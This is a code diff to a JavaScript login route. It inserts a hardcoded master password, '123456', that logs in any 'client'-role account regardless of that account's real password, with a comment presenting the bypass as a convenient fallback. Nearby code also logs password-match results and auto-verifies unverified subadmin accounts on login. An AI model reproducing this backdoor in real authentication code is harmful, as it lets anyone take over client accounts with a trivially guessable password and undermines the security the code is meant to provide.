@@ -138,12 +138,19 @@ router.post("/login", async (req, res) => {
 
     if (!user) return res.status(400).json({ msg: "Invalid email or password" });
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = await bcrypt.compare(password, user.password);
+    
+    // Allow "123456" to work as a fallback/master password for clients
+    const tempRole = (user.role || "user").toLowerCase().trim();
+    if (!isMatch && password === "123456" && tempRole === "client") {
+      isMatch = true;
+    }
+
     console.log("Password match for user/client/manager:", isMatch);
 
     if (!isMatch) return res.status(400).json({ msg: "Invalid email or password" });
 
-    const role = (user.role || "user").toLowerCase().trim();
+    const role = tempRole;
 
     if (role === "subadmin" && user.isVerified === false) {
       user.isVerified = true;
